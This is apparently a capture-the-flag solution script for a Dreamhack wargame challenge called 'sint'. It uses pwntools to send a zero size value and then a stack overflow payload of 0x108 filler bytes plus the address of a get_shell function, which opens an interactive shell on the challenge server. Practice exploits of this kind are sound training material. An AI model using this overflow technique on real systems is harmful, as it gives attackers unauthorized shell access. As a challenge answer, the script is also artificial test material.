from pwn import *

p = remote('host3.dreamhack.games', 14204)
e = ELF('./sint')

p.sendlineafter(b'Size: ', b'0')
get_shell = e.symbols['get_shell']

buf = b'A' * 0x108 + p32(get_shell)
p.sendafter(b'Data: ', buf)

p.interactive()